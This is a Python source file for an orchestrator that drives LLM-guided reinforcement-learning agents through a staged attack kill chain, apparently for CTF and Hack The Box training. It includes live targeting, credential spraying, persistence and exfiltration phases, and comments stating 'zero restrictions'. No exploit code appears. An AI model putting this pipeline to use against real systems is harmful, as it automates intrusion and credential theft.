"""
Smart Orchestrator - Enhanced orchestrator with intelligent command generation.

This orchestrator integrates:
- SmartCoach for command registry validation
- Attack context for rich state representation  
- Smart reward calculation for better learning
- Phase progression tracking
- LiveDashboard for real-time visibility
"""

import os
import re
import time
import logging
import hashlib
import torch
from pathlib import Path
from typing import Dict, Any, List, Optional, Tuple, TYPE_CHECKING
from dataclasses import dataclass, field

from enum import Enum
from core.commands.command_registry import (
    AttackPhase,
    get_phase_from_state,
    COMMAND_REGISTRY,
)
from core.llm.smart_mentor import AttackContext


class TerminationReason(Enum):
    """Reasons for episode termination - Phase 0.1."""
    MAX_STEPS = "max_steps"
    GOAL_REACHED = "goal_reached"
    STUCK_ABORT = "stuck_abort"  # Too many forced-novel failures
    ENV_DONE = "env_done"
    ERROR = "error"
from rich.console import Console as _RichConsole
from rich.panel import Panel as _RichPanel
from core.llm.reward_calculator import SmartRewardCalculator, RewardBreakdown
from core.training.smart_coach import SmartCoach, SmartDecisionResult, SmartStepContext
from core.observability import LiveDashboard, DashboardConfig
from core.tracing.event_bus import EventBus, StepEvent, AgentStepRecord, GenericEvent, EventKind

# Module-level console for CTF celebration panels (Phase 40 fix)
_orch_console = _RichConsole(force_terminal=True)

if TYPE_CHECKING:
    from core.gpt_manager import GPTManager
    from core.environment.cyber_environment import CyberEnvironment
    from core.tracing import TraceWriter
    from core.postmortem import SkillLibrary

logger = logging.getLogger("ariaska.smart_orchestrator")


@dataclass
class SmartOrchestratorConfig:
    """Configuration for the smart orchestrator."""
    
    # Agent activation
    enable_scout: bool = True
    enable_red: bool = True
    enable_blue: bool = True
    enable_orion: bool = True
    enable_shadow: bool = True
    
    # Smart mentor settings — Phase 13.0: Maximum GPT reasoning for autonomous learning
    model: str = "gpt-5.2-codex"  # Phase 12.1: full reasoning model for all mentor/teaching/planning
    mentor_mode: str = "adaptive"  # Phase 11.1: adaptive for accelerated learning
    mentor_warmup_episodes: int = 3  # Phase 11.1: extended warmup for deeper learning
    mentor_min_rate: float = 0.92  # Phase 13.0: +3% (was 0.89) — near-saturation mentor guidance
    mentor_max_rate: float = 1.0
    
    # Stuck detection (legacy)
    stuck_threshold: int = 3
    stuck_negative_streak: int = 5
    stuck_force_mentor: bool = True
    stuck_force_exploration: bool = True
    
    # Phase 0.1: Enhanced stuck-escape config knobs
    stuck_repeat_threshold: int = 5  # Consecutive repeats before forcing novel action
    stuck_history_k: int = 15  # Look back K actions for tag overlap calculation
    stuck_tag_overlap_threshold: float = 0.8  # Mask actions with >= this tag overlap
    stuck_forced_abort_threshold: int = 10  # Terminate episode after N forced-novel failures
    
    # Execution — HTB Capability Upgrade: 60 steps (was 40) for deeper kill chains
    max_steps_per_episode: int = 60
    
    # Logging
    mentor_log_dir: str = "traces"
    
    # Attack context — Post-Phase 20: always live, target from CLI
    default_target: str = ""  # Post-Phase 20: must be specified via CLI --target
    # Post-Phase 20: difficulty always "normal" (unrestricted)
    default_platform: str = "linux"
    
    # Dashboard settings
    dashboard_enabled: bool = True
    dashboard_mode: str = "live"  # "off", "summary", "live", "textual"
    dashboard_watch_rate: float = 1.0
    
    # Phase 6.2: Mentor budget — Phase 11.5: +50% for ultra-accelerated mentor→apprentice guidance
    mentor_budget_pct: float = 1.0  # Phase 12.0: full mentor saturation for maximum learning (already at 1.0 ceiling)
    
    # Phase 6.2: EventBus JSONL logging
    event_jsonl_path: Optional[str] = None
    
    difficulty: str = "normal"  # Post-Phase 31: always "normal" — zero restrictions

    # Phase 26: CTF mode — auto-close on flag capture (user+root), skip CLOSEOUT.
    # Without --ctf, the system only terminates on reaching CLOSEOUT with flags.
    ctf_mode: bool = False


@dataclass
class SmartStepResult:
    """Result from a smart step with full context."""
    agent_name: str
    decision: SmartDecisionResult
    reward_breakdown: Optional[RewardBreakdown] = None
    live_result: Optional[Any] = None  # LiveCommandResult in LIVE mode, None in SIM
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "agent": self.agent_name,
            "command": self.decision.command,
            "template": self.decision.template_name,
            "params": self.decision.params,
            "mentor_call": self.decision.mentor_call,
            "model_used": self.decision.model_used,
            "reasoning": self.decision.mentor_reasoning,
            "phase": self.decision.phase.name,
            "confidence": self.decision.confidence,
            "reward": self.reward_breakdown.total if self.reward_breakdown else 0.0,
        }


class SmartOrchestrator:
    """
    Enhanced orchestrator with intelligent command generation.
    
    Key improvements over base Orchestrator:
    1. Uses SmartCoach for validated, structured commands
    2. Maintains shared AttackContext for all agents
    3. Uses SmartRewardCalculator for phase-aware rewards
    4. Tracks command effectiveness and learns over time
    5. INTELLIGENT AGENT SEQUENCING based on attack phase
    
    Can be used as drop-in replacement for Orchestrator.
    """
    
    # Default order (can be overridden by phase-based logic)
    AGENT_ORDER = ["ScoutAgent", "RedAgent", "BlueAgent", "OrionAgent", "ShadowAgent"]
    
    # Phase-optimized agent ordering for maximum synergy
    PHASE_AGENT_ORDER = {
        # RECON: Scout leads, Shadow for stealth, then Red to probe
        "RECON": ["ScoutAgent", "ShadowAgent", "RedAgent", "OrionAgent", "BlueAgent"],
        
        # ENUMERATION: Scout continues, Red probes, Shadow stealthily checks
        "ENUMERATION": ["ScoutAgent", "RedAgent", "ShadowAgent", "OrionAgent", "BlueAgent"],
        
        # EXPLOITATION: Red leads for attacks, Blue for defense, Orion coordinates
        "EXPLOITATION": ["RedAgent", "OrionAgent", "ShadowAgent", "ScoutAgent", "BlueAgent"],
        
        # PRIVESC: Red exploits, Shadow for persistence, Orion for strategy
        "PRIVILEGE_ESCALATION": ["RedAgent", "ShadowAgent", "OrionAgent", "BlueAgent", "ScoutAgent"],
        
        # LATERAL: Shadow leads stealth movement, Red assists, Orion coordinates
        "LATERAL_MOVEMENT": ["ShadowAgent", "RedAgent", "OrionAgent", "BlueAgent", "ScoutAgent"],
        
        # POST_EX: Shadow for persistence/exfil, Red for cleanup
        "POST_EXPLOITATION": ["ShadowAgent", "RedAgent", "OrionAgent", "BlueAgent", "ScoutAgent"],
        
        # EXFIL: Shadow leads stealth extraction, Blue monitors defense
        "EXFILTRATION": ["ShadowAgent", "RedAgent", "OrionAgent", "BlueAgent", "ScoutAgent"],
        
        # CLOSEOUT: Blue leads restoration, Shadow verifies cleanup, Orion reports
        # Phase 6.9: CLOSEOUT handoff — Shadow leads cleanup, Red/Scout disabled
        "CLOSEOUT": ["ShadowAgent", "BlueAgent", "OrionAgent"],
    }
    
    def get_optimal_agent_order(self, phase: str = "RECON") -> List[str]:
        """
        Get the optimal agent execution order for the current attack phase.
        
        Different phases need different agent leadership:
        - RECON: Scout leads to gather intel, Shadow for stealth recon
        - EXPLOITATION: Red leads the attack, Orion coordinates
        - POST_EX: Shadow leads for stealth persistence/exfil
        
        Returns:
            List of agent names in optimal execution order
        """
        phase_upper = phase.upper().replace(" ", "_")
        
        # Get phase-specific order or default
        optimal_order = self.PHASE_AGENT_ORDER.get(phase_upper, self.AGENT_ORDER)
        
        # Filter to only include enabled agents
        return [agent for agent in optimal_order if agent in self.agents]
    
    def __init__(
        self,
        env: "CyberEnvironment",
        gpt_manager: "GPTManager",
        trace_writer: Optional["TraceWriter"] = None,
        skill_library: Optional["SkillLibrary"] = None,
        config: Optional[SmartOrchestratorConfig] = None,
        verbosity: str = "verbose",  # Post-Phase 20: max verbosity by default
    ):
        self.env = env
        self.gpt_manager = gpt_manager
        self.trace_writer = trace_writer
        self.config = config or SmartOrchestratorConfig()
        self.verbosity = verbosity
        
        self.run_dir: Optional[str] = None
        
        # ─── Phase 17: Ensure resolve_profile() is called ────────
        # Belt-and-suspenders: if CLI didn't call it, do it here.
        # Safe to call multiple times (idempotent).
        if not os.environ.get("PYTEST_CURRENT_TEST"):
            try:
                from core.feature_flags import resolve_profile
                resolve_profile()
            except Exception:
                pass
        
        # ─── Suppress sub-module init noise ─────────────────────────
        # All init status is shown via the Rich init table instead
        _prev_log_level = logging.getLogger().level
        logging.getLogger().setLevel(logging.WARNING)
        
        # ─── Module init tracking ───────────────────────────────────
        _init_modules: List[tuple] = []  # (name, status, detail)
        
        # ─── PHASE 6.3: SkillLibrary — persistent skill cards from postmortems ──
        if skill_library is not None:
            self.skill_library = skill_library
        else:
            try:
                from core.postmortem.skill_library import SkillLibrary
                self.skill_library = SkillLibrary(library_path="data/skill_library.json")
                _skill_count = len(getattr(self.skill_library, 'skills', {}))
                _init_modules.append(("SkillLibrary", "ok", f"{_skill_count} skills"))
            except Exception as e:
                _init_modules.append(("SkillLibrary", "warn", str(e)[:40]))
                self.skill_library = None
        
        # ─── PHASE 6.3: Campaign Memory — cross-episode persistent knowledge ──
        self.campaign_memory = None
        try:
            from core.memory.campaign_memory import CampaignMemory
            self.campaign_memory = CampaignMemory(path="data/campaign_state.json")
            self.campaign_memory.load()
            _init_modules.append(("CampaignMemory", "ok", f"episodes={self.campaign_memory.total_episodes}"))
        except Exception as e:
            _init_modules.append(("CampaignMemory", "warn", str(e)[:40]))
        
        # Phase 6.5: Detect live mode EARLY — needed by watchdog, coaches, reward calc
        self._is_live_mode = getattr(env, 'live_mode', False) or getattr(env, 'mode', '') == 'live'
        
        # ─── PHASE 6.3: Training Watchdog — overnight safety monitor ──
        self.watchdog = None
        try:
            from core.training.watchdog import TrainingWatchdog, WatchdogConfig
            # Phase 6.4: Live mode needs longer timeouts (real commands take time)
            wdog_cfg = WatchdogConfig()
            if self._is_live_mode:
                wdog_cfg.episode_wall_clock_limit = 3600.0  # 1 hour per episode
                wdog_cfg.wall_clock_limit = 120.0  # 2 min per step (some tools are slow)
                wdog_cfg.phase_stuck_threshold = 40  # More patience in live mode
            self.watchdog = TrainingWatchdog(wdog_cfg)
            _init_modules.append(("TrainingWatchdog", "ok", "live-aware" if self._is_live_mode else "sim"))
        except Exception as e:
            _init_modules.append(("TrainingWatchdog", "warn", str(e)[:40]))
        
        # ─── PHASE 10: KnowledgeRetriever — JSON knowledge base queries ──
        # Initialized early so downstream components can reference it.
        self.knowledge_retriever = None
        try:
            from data.knowledge_retriever import KnowledgeRetriever
            self.knowledge_retriever = KnowledgeRetriever(lazy=True)
            _init_modules.append(("KnowledgeRetriever", "ok", "lazy-loaded"))
        except Exception as e:
            logger.debug(f"KnowledgeRetriever init skipped: {e}")
        
        # ─── PHASE 6.3: Smart Output Parser — regex + nano-LLM fallback ──
        self.smart_parser = None
        try:
            from core.execution.smart_output_parser import SmartOutputParser
            self.smart_parser = SmartOutputParser(
                gpt_manager=gpt_manager,
                enable_llm=True,
                max_llm_calls_per_episode=20,
                knowledge_retriever=self.knowledge_retriever,
            )
            _init_modules.append(("SmartOutputParser", "ok", "regex + nano-LLM"))
        except Exception as e:
            _init_modules.append(("SmartOutputParser", "warn", str(e)[:40]))
        
        # ─── Phase 9.5: StepParseCache — dedup parse calls per step ──
        self._parse_cache = None
        try:
            from core.execution.step_parse_cache import StepParseCache
            self._parse_cache = StepParseCache()
            _init_modules.append(("StepParseCache", "ok", "dedup"))
        except Exception as e:
            logger.debug(f"StepParseCache init skipped: {e}")
        
        # ─── PHASE 7.1: OrionPostmortem — uses gpt-5.2-codex for deep analysis ──
        self.postmortem = None
        try:
            from core.postmortem.orion_postmortem import OrionPostmortem
            self.postmortem = OrionPostmortem(
                gpt_manager=gpt_manager,
                output_dir="postmortems",
                enable_gpt_5_2=True,  # Phase 7.1: Use gpt-5.2-codex for postmortems
            )
            _init_modules.append(("OrionPostmortem", "ok", "gpt-5.2-codex"))
        except Exception as e:
            _init_modules.append(("OrionPostmortem", "warn", str(e)[:40]))
        
        # ─── PHASE 7.2: Venice Reasoning Layer — DISABLED (Phase 22: GPT-only) ──
        # Venice adds 5-7s latency per call (6000ms ping). All reasoning
        # now handled by GPT-5.2-codex through LLMOutputInterpreter.
        self.venice_reasoning = None
        _init_modules.append(("VeniceReasoning", "off", "Phase 22: GPT-only"))
        # try:
        #     from core.llm.venice_reasoning import VeniceReasoningLayer
        #     self.venice_reasoning = VeniceReasoningLayer(
        #         gpt_manager=gpt_manager,
        #         call_budget_per_episode=15,
        #         min_output_length=30,
        #         enable_cross_episode_memory=True,
        #     )
        #     _init_modules.append(("VeniceReasoning", "ok", "glm-4.7-flash"))
        # except Exception as e:
        #     _init_modules.append(("VeniceReasoning", "warn", str(e)[:40]))
        
        # ─── PHASE 8: DecisionLogger — JSONL decision telemetry ──
        self.decision_logger = None
        try:
            from core.tracing.jsonl_logger import DecisionLogger
            self.decision_logger = DecisionLogger(log_dir="logs/decisions")
            _init_modules.append(("DecisionLogger", "ok", "JSONL telemetry"))
        except Exception as e:
            _init_modules.append(("DecisionLogger", "warn", str(e)[:40]))
        
        # ─── PHASE 9: CognitiveBus — unified cognitive backbone ──
        self.cognitive_bus = None
        try:
            from core.memory.unified_cognitive_bus import get_cognitive_bus
            self.cognitive_bus = get_cognitive_bus()
            _init_modules.append(("CognitiveBus", "ok", "unified backbone"))
        except Exception as e:
            _init_modules.append(("CognitiveBus", "warn", str(e)[:40]))
        
        # ─── PHASE 9.2: Knowledge Graph — LMDB-backed attack knowledge ──
        self.knowledge_graph = None
        try:
            from core.knowledge.kg_manager import KnowledgeGraph
            self.knowledge_graph = KnowledgeGraph(db_path="data/kg_store")
            KnowledgeGraph.set_instance(self.knowledge_graph)
            _kg_stats = self.knowledge_graph.stats
            if _kg_stats.get("total_nodes", 0) == 0:
                # First run — load from knowledge base
                self.knowledge_graph.load_from_knowledge_base()
                _init_modules.append(("KnowledgeGraph", "ok",
                    f"KB → {self.knowledge_graph.stats.get('total_nodes', 0)} nodes"))
            else:
                _init_modules.append(("KnowledgeGraph", "ok",
                    f"LMDB → {_kg_stats.get('total_nodes', 0)} nodes"))
        except Exception as e:
            _init_modules.append(("KnowledgeGraph", "warn", str(e)[:40]))
        
        # ─── PHASE 9.2: ReflectiveCortex — batch meta-learning ──
        self.reflective_cortex = None
        try:
            from core.llm.reflective_cortex import ReflectiveCortex
            self.reflective_cortex = ReflectiveCortex(
                gpt_manager=gpt_manager,
                knowledge_graph=self.knowledge_graph,
                reflect_interval=10,
                max_history_episodes=20,
                enable_llm=True,
            )
            _init_modules.append(("ReflectiveCortex", "ok", "batch meta-learning"))
        except Exception as e:
            _init_modules.append(("ReflectiveCortex", "warn", str(e)[:40]))
        
        # ─── PHASE 10: TacticalCortex — per-step quality gate ──
        self.tactical_cortex = None
        try:
            from core.cortex.tactical_cortex import TacticalCortex
            self.tactical_cortex = TacticalCortex(
                gpt_manager=gpt_manager,
                max_llm_calls=5,
                enable_llm=True,
                knowledge_retriever=self.knowledge_retriever,
            )
            _init_modules.append(("TacticalCortex", "ok", "per-step quality gate"))
        except Exception as e:
            _init_modules.append(("TacticalCortex", "warn", str(e)[:40]))
        
        # ─── PHASE 10: ExecutiveCortex — episode-level strategic planner ──
        self.executive_cortex = None
        try:
            from core.cortex.executive_cortex import ExecutiveCortex
            self.executive_cortex = ExecutiveCortex(
                gpt_manager=gpt_manager,
                max_llm_calls=3,
                enable_llm=True,
                knowledge_retriever=self.knowledge_retriever,
            )
            _init_modules.append(("ExecutiveCortex", "ok", "episode-level planner"))
        except Exception as e:
            _init_modules.append(("ExecutiveCortex", "warn", str(e)[:40]))
        
        # ─── PHASE 10: TargetProfiler — service archetype classification ──
        self.target_profiler = None
        try:
            from core.knowledge.target_profiler import TargetProfiler
            self.target_profiler = TargetProfiler(
                knowledge_graph=self.knowledge_graph,
            )
            _init_modules.append(("TargetProfiler", "ok", "service archetype"))
        except Exception as e:
            _init_modules.append(("TargetProfiler", "warn", str(e)[:40]))
        
        # ─── PHASE 11.0: ParserBroker v2.0 — dual-mode parsing pipeline ──
        self.parser_broker = None
        try:
            from core.execution.parser_broker import ParserBroker
            from core.feature_flags import get_feature_flags
            _ff = get_feature_flags()
            self.parser_broker = ParserBroker(
                gpt_manager=gpt_manager,
                venice=None,              # Phase 22: Venice disabled — GPT-only
                enable_venice=False,       # Phase 22: GPT-5.2-codex handles all parsing
                enable_gpt=True,
                max_llm_calls_per_episode=80,   # Phase 22: doubled — GPT handles everything
                max_venice_calls_per_episode=0,  # Phase 22: Venice disabled
                default_mode=_ff.parser_mode,
            )
            _init_modules.append(("ParserBroker", "ok", f"v2.0 mode={_ff.parser_mode}"))
        except Exception as e:
            _init_modules.append(("ParserBroker", "warn", str(e)[:40]))
        
        # ─── PHASE 11.0: AdaptiveBudgetController ──
        self.budget_controller = None
        try:
            from core.training.adaptive_budget import AdaptiveBudgetController, BudgetConfig
            from core.feature_flags import get_feature_flags
            _ff = get_feature_flags()
            if _ff.adaptive_budget:
                self.budget_controller = AdaptiveBudgetController(
                    config=BudgetConfig(
                        mentor_budget_total=140,  # Phase 13.0: +57% (was 89) — maximum GPT reasoning guidance
                        venice_budget_total=50,   # Phase 13.0: +43% (was 35) — Venice second-brain validation
                        token_budget_total=292_500,  # Phase 13.0: +100% (was 146.25K) — full reasoning depth
                    )
                )
                _init_modules.append(("AdaptiveBudget", "ok", "adaptive pacing"))
        except Exception as e:
            _init_modules.append(("AdaptiveBudget", "warn", str(e)[:40]))
        
        # Phase 12.1: Wire budget controller into Venice reasoning
        # Phase 22: Venice disabled — GPT-only mode
        # if self.budget_controller is not None and self.venice_reasoning is not None:
        #     self.venice_reasoning._budget_controller = self.budget_controller
        
        # ─── PHASE 11.0: LearningSignalExporter ──
        self.learning_exporter = None
        try:
            from core.telemetry.learning_signal_exporter import LearningSignalExporter
            from core.feature_flags import get_feature_flags
            _ff = get_feature_flags()
            if _ff.learning_signal_export:
                self.learning_exporter = LearningSignalExporter(
                    run_id=getattr(self.config, 'run_id', ''),
                    output_dir="logs",
                    enabled=True,
                )
                _init_modules.append(("LearningExporter", "ok", "JSONL signals"))
        except Exception as e:
            _init_modules.append(("LearningExporter", "warn", str(e)[:40]))
        
        # ─── PHASE 11.0: ToolValidator ──
        self.tool_validator = None
        try:
            from core.commands.tool_validator import ToolValidator
            self.tool_validator = ToolValidator(check_availability=False)
            _init_modules.append(("ToolValidator", "ok", "privilege checks"))
        except Exception as e:
            _init_modules.append(("ToolValidator", "warn", str(e)[:40]))
        
        # ─── HTB T0.1: ArtifactStore — binary-safe file capture ──
        self.artifact_store = None
        try:
            from core.execution.artifact_store import ArtifactStore
            self.artifact_store = ArtifactStore(base_dir="artifacts/captures")
            _init_modules.append(("ArtifactStore", "ok", "binary capture"))
        except Exception as e:
            _init_modules.append(("ArtifactStore", "warn", str(e)[:40]))
        
        # ─── HTB T0.2: PcapExtractor — tshark + strings credential extraction ──
        self.pcap_extractor = None
        try:
            from core.execution.pcap_extractor import PcapExtractor
            self.pcap_extractor = PcapExtractor(timeout=30)
            _init_modules.append(("PcapExtractor", "ok",
                f"tshark={'yes' if self.pcap_extractor.has_tshark else 'no'}"))
        except Exception as e:
            _init_modules.append(("PcapExtractor", "warn", str(e)[:40]))
        
        # ─── HTB T0.3: CredentialReuseEngine — auto-spray discovered creds ──
        self.cred_reuse_engine = None
        try:
            from core.execution.cred_reuse import CredentialReuseEngine
            _target = getattr(self.config, 'default_target', '172.28.0.11')
            self.cred_reuse_engine = CredentialReuseEngine(target_ip=_target)
            _init_modules.append(("CredReuseEngine", "ok", f"target={_target}"))
        except Exception as e:
            _init_modules.append(("CredReuseEngine", "warn", str(e)[:40]))
        
        # ─── HTB D1: FollowupQueue — priority-based command injection ──
        self.followup_queue: List[Dict[str, Any]] = []

        # ─── P34-EXT: LearningMetrics — per-step/episode learning quality ──
        self.learning_metrics = None
        try:
            from core.analytics.learning_metrics import LearningMetrics
            _lm_dir = os.path.join("logs", "learning")
            self.learning_metrics = LearningMetrics(
                log_dir=_lm_dir, window_size=5, print_every=5,
            )
            _init_modules.append(("LearningMetrics", "ok", "JSONL + dashboard"))
        except Exception as e:
            _init_modules.append(("LearningMetrics", "warn", str(e)[:40]))

        # ─── P36.1: FastLearnMetrics — value/advantage/distillation/MC tracking ──
        self.fast_learn_metrics = None
        try:
            from core.analytics.fast_learn_metrics import FastLearnMetrics
            self.fast_learn_metrics = FastLearnMetrics(
                log_dir=os.path.join("runs"),
                log_every=5,
            )
            _init_modules.append(("FastLearnMetrics", "ok", "JSONL + governor"))
        except Exception as e:
            _init_modules.append(("FastLearnMetrics", "warn", str(e)[:40]))
        
        # ─── P35: CoherenceChain — 4-step nano anti-hallucination chain ──
        self.coherence_chain = None
        self._last_coherence_result = None
        try:
            from core.state.coherence_chain import CoherenceChain
            self.coherence_chain = CoherenceChain(gpt_manager=self.gpt_manager)
            _init_modules.append(("CoherenceChain", "ok", "nano 4-step"))
        except Exception as e:
            _init_modules.append(("CoherenceChain", "warn", str(e)[:40]))
        
        # ─── P35: LiveTraceWriter — append-only JSONL per step ──
        self.live_trace_writer = None
        try:
            from core.state.live_trace import LiveTraceWriter
            self.live_trace_writer = LiveTraceWriter(base_dir="runs")
            _init_modules.append(("LiveTrace", "ok", "JSONL append"))
        except Exception as e:
            _init_modules.append(("LiveTrace", "warn", str(e)[:40]))
        
        # Initialize agents
        self.agents: Dict[str, Any] = {}
        self._init_agents()
        
        # Initialize smart coaches
        self.coaches: Dict[str, SmartCoach] = {}
        self._init_smart_coaches()
        
        # Shared attack context (all agents see same state)
        self.attack_context: Optional[AttackContext] = None
        
        # Global reward calculator (for episode-level tracking)
        # Phase 6.4: MS2-aware if in live mode
        self.global_reward_calc = SmartRewardCalculator(ms2_mode=self._is_live_mode)
        
        # Episode tracking
        self.current_episode = 0
        self._current_episode_id = 0  # Phase 9.5: for parse cache keying
        self.current_step = 0
        self.total_episodes = 0
        self.run_id: Optional[str] = None
        self.start_time: Optional[float] = None
        
        # Enhanced stuck detection
        self.action_history: Dict[str, List[str]] = {}
        self.stuck_agents: set = set()
        
        # Phase 0.1: Per-agent stuck tracking
        self.repeat_stuck_count: Dict[str, int] = {}  # Consecutive repeats per agent
        self.deep_stuck_count: Dict[str, int] = {}  # Forced-novel failures per agent
        self.forced_novel_count: Dict[str, int] = {}  # Successful forced-novel actions per agent
        self.phase_progressed_this_episode: bool = False  # True if phase advanced
        self._phase_start_step: Dict[str, int] = {}  # Track when each phase started
        self.episode_termination_reason: TerminationReason = TerminationReason.MAX_STEPS
        self.previous_discoveries: Dict[str, Any] = {}  # For discoveries_delta calculation
        
        # ─── PHASE 4: Cross-Agent Discovery Board ────────────────────
        # Shared state that all agents can read. Populated after each
        # agent step so that later agents benefit from earlier agents'
        # discoveries within the same step.
        self.discovery_board: Dict[str, Any] = {
            "ports": set(),
            "services": set(),
            "credentials": set(),
            "vulns": set(),
            "shells": set(),
            "users": set(),
            "web_paths": set(),
            "phase": "RECON",
            "flags_set": set(),
            # Phase 7.1: Track exploited services/ports to prevent re-exploitation
            "exploited_services": set(),  # e.g. {"ssh:22", "ftp:21", "samba:445"}
            "exploited_ports": set(),     # e.g. {21, 22, 445}
            # HTB Capability Upgrade: Structured credential + capability tracking
            "credentials_list": [],       # List of {username, password, service, source}
            "capabilities": set(),        # Linux capabilities found (e.g. "python3:cap_setuid")
            "downloaded_files": set(),    # Files downloaded to /tmp/
            "hashes": [],                 # Password hashes for cracking
        }
        # Stagnation tracking per agent
        self._steps_without_discoveries: Dict[str, int] = {}
        
        # ─── Display init progress via Rich dashboard ──────────────
        _init_modules.append(("Agents", "ok", ", ".join(self.agents.keys())))
        _init_modules.append(("SmartCoaches", "ok", f"{len(self.coaches)} coaches"))
        
        # Initialize LiveDashboard for real-time visibility
        self.dashboard = self._init_dashboard()
        
        # ─── PHASE 6.2: EventBus for decoupled event-driven architecture ──
        self.event_bus = EventBus(
            jsonl_path=self.config.event_jsonl_path,
        )
        # Wire dashboard as EventBus subscriber if textual mode
        if self.config.dashboard_mode == "textual":
            try:
                from core.ui.textual_dashboard import create_textual_dashboard
                self.textual_dashboard = create_textual_dashboard()
                self.event_bus.subscribe(self.textual_dashboard.on_event)
                logger.info("Phase 6.2: Textual dashboard subscribed to EventBus")
            except Exception as e:
                logger.warning(f"Textual dashboard init failed: {e}")
                self.textual_dashboard = None
        else:
            self.textual_dashboard = None
        
        # ─── PHASE 3: PPO Agent Integration ──────────────────────────
        # Creates a PPO actor-critic that runs alongside the existing
        # SmartCoach pipeline. Collects trajectories during episodes
        # and updates after each episode.
        self.ppo_agent = None
        self._ppo_trajectory: List[Dict] = []  # Per-episode trajectory
        try:
            from core.algorithms.ppo_agent import PPOAgent, PPOConfig
            ppo_config = PPOConfig(
                state_dim=512,
                action_dim=5,  # recon, enumeration, exploit, privesc, exfiltrate
                hidden_dims=[512, 512, 256],
                clip_epsilon=0.2,
                gamma=0.99,
                gae_lambda=0.95,
                learning_rate=3e-4,
                epochs_per_update=3,
                minibatch_size=8,
                entropy_coef=0.01,
                rollout_size=32,
            )
            device = "cuda" if torch.cuda.is_available() else "cpu"
            self.ppo_agent = PPOAgent(config=ppo_config, device=device)
            _init_modules.append(("PPO Actor-Critic", "ok", f"device={device}, dim=512→5"))

            # Phase 40: Auto-load best distilled checkpoint if available
            if os.environ.get("ARIASKA_LOAD_DISTILLED", "1") == "1":
                self.load_distilled_checkpoint()
        except Exception as e:
            _init_modules.append(("PPO Actor-Critic", "warn", str(e)[:40]))

        # ─── Phase 41: Auto-load ALL .pt checkpoints ────────────────
        # Load best enhanced per-agent PPO + DDQN into each coach,
        # plus distilled GPU checkpoints (which have 10-100× more
        # training steps). Without this, the GPU training is wasted.
        try:
            loaded = self._auto_load_all_checkpoints()
            if loaded > 0:
                _init_modules.append(("AutoLoad .pt", "ok", f"{loaded} checkpoints loaded"))
            else:
                _init_modules.append(("AutoLoad .pt", "warn", "no checkpoints found"))
        except Exception as e:
            _init_modules.append(("AutoLoad .pt", "warn", str(e)[:60]))
        
        # ─── R66: RND Curiosity Module ───────────────────────────────
        self.rnd_curiosity = None
        try:
            from core.algorithms.rnd_curiosity import RNDCuriosity
            self.rnd_curiosity = RNDCuriosity(
                state_dim=512, hidden_dim=256, output_dim=128,
                reward_scale=1.0, reward_cap=5.0, ms3_multiplier=1.5,
            )
            _init_modules.append(("RND Curiosity", "ok", "intrinsic motivation"))
        except Exception as e:
            _init_modules.append(("RND Curiosity", "warn", str(e)[:40]))
        
        # ─── R66: Coherence Tracker ──────────────────────────────────
        self.coherence_tracker = None
        try:
            from core.analytics.coherence import CoherenceTracker
            self.coherence_tracker = CoherenceTracker(window_size=10)
            _init_modules.append(("CoherenceTracker", "ok", "window=10"))
        except Exception as e:
            _init_modules.append(("CoherenceTracker", "warn", str(e)[:40]))
        
        # ─── R67: Reward Velocity Tracker ────────────────────────────
        self.reward_velocity = None
        try:
            from core.analytics.reward_velocity import RewardVelocityTracker
            self.reward_velocity = RewardVelocityTracker(window_size=8, stall_threshold=15.0)
            _init_modules.append(("RewardVelocity", "ok", "stall_thresh=15.0"))
        except Exception as e:
            _init_modules.append(("RewardVelocity", "warn", str(e)[:40]))

        # ─── R67: Shared Discovery Dedup ─────────────────────────────
        self.shared_discovery = None
        try:
            from core.analytics.discovery_dedup import SharedDiscoverySet
            self.shared_discovery = SharedDiscoverySet()
            _init_modules.append(("SharedDiscovery", "ok", "dedup set"))
        except Exception as e:
            _init_modules.append(("SharedDiscovery", "warn", str(e)[:40]))

        # ─── R66: Scan Exposure Randomizer ───────────────────────────
        self.scan_randomizer = None  # Initialized per-run with seed
        
        # ─── Phase 9.7: Telemetry JSONL Logger ──────────────────────
        self._telemetry_logger = None
        try:
            from core.feature_flags import get_feature_flags
            if get_feature_flags().jsonl_telemetry:
                from core.telemetry.jsonl_logger import JSONLLogger
                self._telemetry_logger = JSONLLogger(
                    run_id="",  # set per-run in run_training()
                    output_dir="logs/telemetry",
                    buffer_size=50,
                    enabled=True,
                )
                _init_modules.append(("TelemetryLogger", "ok", "JSONL buffer=50"))
        except Exception as e:
            logger.debug(f"Telemetry logger init skipped: {e}")

        # ─── R66: JSONL RunLogger ────────────────────────────────────
        self.run_logger = None  # Initialized per-run with tag
        
        # ─── Phase 39.0: OpsHub — unified OPS subsystem gateway ─────
        self.ops_hub = None
        try:
            from core.feature_flags import get_feature_flags as _gff
            if _gff().ops_hub:
                from core.ops.ops_hub import OpsHub, OpsHubConfig
                _ops_cfg = OpsHubConfig(
                    target_ip=getattr(env, 'live_target_ip', None) or self.config.default_target,
                )
                self.ops_hub = OpsHub(_ops_cfg)
                self.ops_hub.setup()
                _init_modules.append(("OpsHub", "ok", "unified OPS gateway"))
        except Exception as e:
            _init_modules.append(("OpsHub", "warn", str(e)[:40]))

        # ─── Phase 39.1: Orion Rethink Engine ────────────────────────
        self.orion_rethink = None
        try:
            from core.feature_flags import get_feature_flags as _gff
            if _gff().orion_rethink:
                from core.ops.orion_rethink import OrionRethinkEngine
                self.orion_rethink = OrionRethinkEngine()
                _init_modules.append(("OrionRethink", "ok", "stall detector"))
        except Exception as e:
            _init_modules.append(("OrionRethink", "warn", str(e)[:40]))

        # ─── Phase 39.2: Trust Weight Engine ─────────────────────────
        self.trust_engine = None
        try:
            from core.feature_flags import get_feature_flags as _gff
            if _gff().trust_weights:
                from core.ops.trust_weights import TrustWeightEngine
                self.trust_engine = TrustWeightEngine()
                self.trust_engine.register_source("mentor")
                self.trust_engine.register_source("micro_chain")
                self.trust_engine.register_source("phase_guided")
                self.trust_engine.register_source("ppo")
                self.trust_engine.register_source("registry")
                _init_modules.append(("TrustWeights", "ok", "5 sources"))
        except Exception as e:
            _init_modules.append(("TrustWeights", "warn", str(e)[:40]))

        # ─── Phase 39.4: Debug Tracer ────────────────────────────────
        self.debug_tracer = None
        try:
            from core.feature_flags import get_feature_flags as _gff
            if _gff().debug_trace:
                from core.ops.debug_trace import DebugTracer
                import uuid as _uuid
                _run_id = str(_uuid.uuid4())[:8]
                self.debug_tracer = DebugTracer(
                    run_id=_run_id,
                    log_dir="logs/debug_traces",
                )
